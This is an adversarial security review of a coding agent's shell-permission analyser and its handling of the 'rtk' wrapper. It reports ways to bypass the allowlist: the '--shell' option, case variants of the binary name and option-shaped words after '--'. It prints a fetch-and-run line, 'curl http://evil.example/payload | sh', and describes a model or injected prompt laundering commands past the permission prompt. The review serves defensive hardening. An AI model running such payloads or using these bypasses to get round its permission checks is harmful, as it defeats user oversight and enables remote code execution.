# Review: phase 6 — rtk, graphify, skills ecosystem compatibility (adversarial pass 2)

Date: 2026-10-06
Branch: phase/6-rtk-graphify-ecosystem   Range: 5506c38..HEAD (de5beb5) (8 commits, 42 files changed)
Plan: docs/plans/phase-6-rtk-graphify-ecosystem.md   Spec: DESIGN.md §7 §9 §10 §13; SPECS §1 §11 §12 §15
Follows up: None — independent adversarial second pass, run in parallel with the primary pass

## Verdict

Approve with fixes — the rtk unwrap contract holds under every laundering shape I could construct, the corpus is byte-verified, and all five new test groups were proven capable of failing by source mutation. One High finding stands: a real-CLI probe showed `rtk test|err|summary --shell <sh> <string>` executes a shell command string through an external binary while the analyser treats `--shell` only as a flag-terminator — exactly the laundering class this phase was built to close. Several Medium/Low issues around runner-option modelling and the `--` blind spot accompany it.

## Summary

Phase 6 delivers the rtk unwrap (rtk.go + shell.go restructure), an 88-subcommand class table captured from the real CLI, the vendored ecosystem corpus with provenance/SHA-256, frontmatter parser fixes, the `extractBuiltins(fsys)` refactor with MapFS re-extraction test, and the `NewJail` read-root fix.

Counts: **1 High, 3 Medium, 4 Low.** The core promise — `rtk <cmd>` never launders a non-allowlisted command — is solid for the direct, wrapped, piped, substituted and nested-rtk forms I probed; the gap is rtk's own `--shell` option on the runner class and the value-position modelling around it (see H1, M1–M3).

## Checks run

| Check | Result |
|---|---|
| gofmt -l . | clean |
| go vet ./... | clean (exit 0) |
| go test -race -count=1 ./... | all 13 packages ok, no failures |
| SHA-256 spot check (5 of 13 vendored files vs SOURCES.md) | all match |
| Synthetic mutation of repo copy (5 mutations) | every targeted test failed as intended |

Not verified: the phase's live gates (real OpenCode session legs, graphify live query) — recorded in the plan's Implementation notes; I did not re-run them (no live API calls in review). rtk `--shell` behaviour with tools not installed on this host (ast-grep, rg path all verified with the real binaries where present).

## Plan conformance

- Task 1 (table): done, from the real CLI — I re-derived the 88-subcommand list from `rtk --help` and agree with the classes, with the exceptions below.
- Task 2 (unwrap): done; the plan's `rtkDashDash` sketch was replaced by the runner class — the deviation is recorded in the plan's Implementation notes and is correct (`rtk test echo x` runs directly, which the sketch would have laundered).
- Task 3 (corpus): done; 13/13 expected entries, byte guards on CRLF/BOM, provenance + SHA-256 in SOURCES.md.
- Task 4 (skill read roots + built-in re-extraction): done; the plan's `.hash`-file scheme was pre-empted by phase 2's content-hash directories — deviation recorded.
- Task 5 (prompt templates): done, Claude Code + pi shapes load and expand.
- Task 6 (docs + live gates): done; gate results recorded in the plan. Live legs are claimed with concrete command/advisor evidence; not re-verified here.
- Review Focus items 1–5: each has code + a test; I re-verified 1, 2 and 5 with probes; 3 and 4 via the corpus and agent tests.

## Review Focus

1. Flags before the subcommand — satisfied (`rtkSub` skips leading flags; probe `rtk -v python x` → `need=[python]`, also `-vvv`, `--ultra-compact`, `--skip-env`, unknown flags all classify the wrapped command; rtk_test.go rows).
2. `rtk proxy rm -rf x` / `rtk test -- sudo make` — satisfied (probe: `every=[rm]` / deny sudo; also through `timeout`, `env`).
3. `description: Use when: …` unquoted — satisfied (`synthetic/colon-unquoted` fixture + expected.json).
4. Skill supporting files readable — satisfied (`TestModelCanReadGlobalSkillSupportFiles`; proven to fail against the pre-fix jail via source mutation in a repo copy).
5. Claude Code command frontmatter — satisfied (`TestEcosystemPromptsLoad`; unknown keys ignored, `$ARGUMENTS`/`$1` expand).

## Findings

### High

#### 1. `rtk test|err|summary --shell <sh> <string>` executes a shell command the analyser allows as if it were argv — Confirmed (probe on the real CLI + a listener spy)

`internal/permissions/rtk.go:107` — inside `rtkRunTarget`, `--shell` (without `=`) is not in the bare-flag set and falls into the unknown-option refusal, which is correct. But when `--shell` appears **after the first positional word**, `rtkRunTarget` has already returned the command index (line 114 `default: return j, false, nil`) and never scans further — so everything after the first positional, including `--shell sh '<command string>'`, is treated as opaque argv of the classified command.

Failure scenario (verified against installed rtk 0.51.0, in a scratch dir):

```
$ rtk test --shell sh 'curl http://evil.example/payload | sh'
       → curl runs. Only `rtk` (allowlisted) would appear in the verdict;
         the classified first word is a decoy.
$ rtk err echo hi --shell ./spy.sh 'x y'     → spy.sh executed with `-c x y` (exit 3 leg proved execution)
$ rtk run --shell sh 'echo PWNED_MARK'       → executes the string
```

I proved execution with a spy script appended to a log file through `rtk test|err|summary --shell ./spy.sh MARKER_*` — the log shows `PROBE_RAN_ARGC=2 ARGV=-c MARKER_test|err|summary`, i.e. rtk passes a `-c`-style shell-string body to whatever binary `--shell` names. `rtk test go build --shell sh 'PWNED'` appended nothing only because `go` is not on this shell's PATH (`go: command not found`) — the `--shell` entry itself is *not* guarded, it is simply displaced. With the default allowlist (which includes `go`, `make`, `python`, `node`, …) the interaction class is fully exploitable with e.g. `<allowlisted-interactive> --shell sh 'curl … | sh'`; a probe confirms the analyser passes `rtk test go test ./... --shell sh 'echo PWNED'` with `err=nil`.

Proposed fix: after `rtkRunTarget` selects the command index, scan the **remaining** args (and the args before the sub word) for `--shell`/`-c`/`--command`/`--command=`/`--shell=` in any position and refuse the command (the same string-table as today, but position-independent). Alternatively, if a later rtk pins interspersed options out, add a `rtk version` check that refuses on a version skew.

### Medium

#### 2. `rtk run|test -- <word>` classifies the bare `-c`/`--shell` as a command name — Confirmed

`internal/permissions/rtk.go:102-106` — after `--`, any literal word becomes the classified command. `rtk test -- --` classifies `--` as a command need; `rtk run -- -c` classifies `-c` as needing allowlist. Real rtk in both cases errors out (`command is required` / clap separator semantics), so this is a false-allow surface only if a stray `-c` is present **and** rtk's argv dispatch changed — the risk is that a *future* rtk accepts `rtk run -- -c 'string'`-shaped argv and the analyser has already whitelist-blessed the literal `-c`. Probe output confirms the current behaviour is benign but the shape is a trap.

Proposed fix: refuse the whole command when the word after `--` is itself option-shaped (`-` prefix) instead of classifying it.

#### 3. case-sensitive `filepath.Base(name)` switch misses `RTK`/`Rtk`/`./RTK` — Confirmed (behavioural, not a laundering hole)

`internal/permissions/shell.go:311-322` — the `unwrap` switch on `filepath.Base(name)` is case-sensitive; `RTK proxy python3 x` and `Rtk proxy python3 x` fall to the `default` arm, so `RTK` alone is classified and `python3` never is. `Allow()` lowercases new allowlist entries but `classify` is case-sensitive too, so `RTK` becomes a *new unallowlisted command name* the user is asked about once — but if the user answers "allow always", `RTK Proxy python3` then classifies only `RTK` and `Proxy` and finally `python3` is never checked: the probe shows `need=[RTK]` and `err=nil`, i.e. one allow-always click launders everything after any case/service-name variant of rtk.

Failure scenario: model (or injected prompt) runs `RTK proxy python3 -c 'fetch http://x'`; on the first call the user clicks **allow always** expecting "the RTK binary"; subsequent `RTK proxy python3 …` lines are then auto-approved without any per-command analysis.

Proposed fix: in `unwrap` (and `rtkTarget`'s sub switch) compare `strings.ToLower(filepath.Base(name))`; keep `classify` case-conscious so the TUI still shows the original casing from arguments.

#### 4. Windows analyser does not unwrap rtk — Confirmed; severity M on Windows only

`internal/permissions/shell_windows_rules.go:15` — `checkWindows` checks only `fields[0]` per segment, so `rtk proxy curl …` on Windows classifies only `rtk`. DESIGN §7 documents Windows shell analysis as best-effort/weaker by design and no doc claims rtk-unwrap coverage there (docs/external-tools.md §rtk is silent on Windows; SPECS §11 says "Unix; parses with mvdan.cc/sh"). Because this is the documented best-effort surface, this is recorded as Medium for the Windows binary, not the same High as the Unix hole — but it is the same laundering idea on a weaker parser, and worth a one-line `rtk`/`env`-style head-token skip so the weakest analyser still refuses the wrapped command name.

Proposed fix: in `checkWindows`, if `fields[0]` (case-insensitive, `.exe`-trimmed) is `rtk`, step to the first non-option field and classify that too; document the residual weakness in `docs/external-tools.md`.

### Low

#### 5. Commit hash pin for anthropics/skills is only recorded, not re-verified; frontend-design SKILL.md content drift would silently behave the same — Confirmed as a process gap

`internal/skills/testdata/ecosystem/SOURCES.md` — provenance for all five upstreams is a table entry plus the pinned commit; nothing in CI re-fetches to confirm the vendored bytes still match the pinned SHA-256 of the *upstream* (my spot check confirms the committed files match SOURCES.md's own hashes, but that's self-consistency, not drift detection). A one-command `sha256sum -c --quiet <(awk … SOURCES.md)` in CI (or a test reading SOURCES.md) would make the "byte-for-byte copies" claim enforceable.

Proposed fix: add a small test that recomputes the SHA-256 column in SOURCES.md against the corpus directory, so an accidental fixture edit fails CI (today only the CRLF/BOM guards catch their two files).

#### 6. `expected.json` entries for skills *removed from the corpus* would silently lower `seen` — Confirmed (test hygiene)

`internal/skills/ecosystem_test.go:57-59` — the final `if seen != len(expected)` catches a corpus file that fails to load but *not* an expected entry whose directory was deleted: `got` then has no member for that key and `seen` simply stays short only if the missing skill was the *only* one under its source; if another skill sits under the same source dir, `seen` still reaches `len(expected)` only when counts align numerically — in this corpus each key is unique per skill, so a deleted skill dir *would* be caught. The soft spot is subtler: an expected entry whose skill dir still exists but whose SKILL.md is renamed gets caught too. Only a wholesale equal-count coincidence could mask it; with 13 distinct skills that's practically impossible — noting for completeness rather than as a live bug.

Proposed fix: iterate `expected` keys as the driver and assert each was seen (reflection of the loop above); cheap and removes the reasoning here entirely.

#### 7. frontmatter: folded block swallows a value that *is* the folded line when the block is empty — Confirmed but unreachable through Discover

`internal/skills/frontmatter.go:38-53` — a `description: >` whose block body is entirely blank collapses to `""` and `Discover` then skips the skill with "missing description; skill skipped", which is the correct fail-closed outcome. Similarly `|+`/`|2`/`>-`/`>-2` and unterminated quotes fall through harmlessly (probes: `|+` keeps its raw indicator as the value, `>-` folds like `>`, `"-never closed` keeps the raw opening quote). None of these produce a wrong description in a way that reaches the prompt with content the author did not write — the drift is silently *cosmetic* rather than semantic. Recorded so a future parser revision knows the subset boundary; no action.

#### 8. `rtk smart -m <model>` is in rtkSelf while a local-model path would be user-supplied — Confirmed, benign on 0.51.0

`internal/permissions/rtk.go:41` — `smart` is classified as self; the CLI accepts `-m, --model <MODEL>` with `heuristic` default, and probe showed `rtk smart --model ./spy.sh spy.sh` does not execute the model argument (no download attempted, heuristic path). If a future rtk adds a model-download hook that executes the `--model` value (e.g. a `python -c`-shaped shim), the rtkSelf classification would have blessed it by then. Low because it depends on a future rtk change; the `rtk.go` table comment ("Re-check when bumping") is the mechanism that catches it.

Proposed fix: none needed beyond the existing version-comment contract; optionally add `rtk smart --help` output to a fixture test so a future bump shows a diff instead of a silent semantic change.

## Earlier findings

No earlier review file covers code in this range (previous phases' open findings touch `largestEntries`, MCP importer surface and TUI code this phase does not modify). The phase-2 wrapper-option machinery this phase refactor extracted (skipWrapperOpts) behaves identically — the phase-2 ladder passes unchanged.

## Suggested order of fixes

1. H1 (`rtk --shell` through a runner): position-independent scan for shell-string options after the command word; add `rtk test go … --shell sh '<string>'`, `rtk err x --shell ./payload`, `rtk test --shell sh '<string>'` to rtk_test.go with deny expectations.
2. M3 (case variants): lowercase the unwrap/rtkTarget switch; add `RTK proxy python3`, `Rtk proxy python3`.
3. M2 (`--` then option-shaped word): refuse instead of classify; add `rtk test -- -c`, `rtk run -- --shell`.
4. M4 (Windows): head-token skip for rtk in checkWindows + a doc line in docs/external-tools.md.
5. L5, L6: SOURCES.md hash test; invert the ecosystem loop to be driven by expected.json.
